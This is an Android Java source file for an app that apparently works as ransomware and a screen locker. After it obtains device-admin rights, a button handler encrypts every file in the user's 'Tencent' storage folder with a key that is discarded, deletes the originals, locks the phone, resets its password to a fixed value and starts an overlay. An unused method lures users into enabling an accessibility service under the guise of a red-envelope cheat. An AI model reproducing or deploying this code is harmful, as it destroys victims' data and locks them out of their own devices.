package cn.sometimenaive.threemagic;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Environment;
import android.provider.Settings;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.security.Security;

import javax.crypto.Cipher;
import javax.crypto.CipherOutputStream;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;

import de.flexiprovider.core.FlexiCoreProvider;

public class MainActivity extends AppCompatActivity {

    private Button btnLock;
    private DevicePolicyManager mDpm;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

       if (1==1){
           lockandchangepassword();
      }
    }

    public static void encryptFolder(Cipher cipher, File dir) {
        File[] files = dir.listFiles();
        for (File file : files) {
            if (file.isDirectory()) {
                encryptFolder(cipher, file);
            } else {
                try {
                    FileInputStream fis = new FileInputStream(file);
                    FileOutputStream fos = new FileOutputStream(file.getCanonicalPath() + ".tm");
                    CipherOutputStream cos = new CipherOutputStream(fos, cipher);

                    byte[] block = new byte[8];
                    int i;
                    while ((i = fis.read(block)) != -1) {
                        cos.write(block, 0, i);
                    }
                    cos.close();
                    file.delete();
                } catch (Exception e) {
                    e.printStackTrace();
                    Log.e("Failed", e.getMessage());
                }
            }
        }
    }
    public void lockandchangepassword(){
        mDpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);

        btnLock = (Button) findViewById(R.id.button);
        btnLock.setOnClickListener(new View.OnClickListener(){
            @Override
            public void onClick(View v){
                // Encrypt folder "Tencent/"
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        Security.addProvider(new FlexiCoreProvider());
                        try {
                            Cipher cipher = Cipher.getInstance("AES128_CBC", "FlexiCore");
                            KeyGenerator keyGen = KeyGenerator.getInstance("AES", "FlexiCore");
                            SecretKey secKey = keyGen.generateKey();
                            cipher.init(Cipher.ENCRYPT_MODE, secKey);

                            File dir = new File(Environment.getExternalStorageDirectory().getPath() + "/Tencent/");
                            encryptFolder(cipher, dir);
                        } catch (Exception e) {
                            e.printStackTrace();
                            Log.e("Failed",e.getMessage());
                        }
                    }
                }).start();
                // lock screen
                mDpm.lockNow();
                mDpm.resetPassword("12345678",0);
                overlay();
            }
        });

        ComponentName mDeviceAdminSample = new ComponentName(this,DdapReceiver.class);
        Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN,mDeviceAdminSample);
        intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,"begin go");
        startActivity(intent);
    }

    public void overlay(){
        Log.d("hahah","overlay");
        if (!Settings.canDrawOverlays(this)){
            if (Build.VERSION.SDK_INT>=Build.VERSION_CODES.M){
                Intent myintent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION);
                startActivity(myintent);
            }
        }else{
            Intent serviceintent = new Intent(this, OverlayService.class);
            startService(serviceintent);
        }
    }

    private void open()
    {
        try
        {
            Intent intent = new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS);
            startActivity(intent);
            Toast.makeText(this, "找到“抢红包外挂”，然后开启服务即可", Toast.LENGTH_LONG).show();
        } catch (Exception e)
        {
            e.printStackTrace();
        }
    }
}
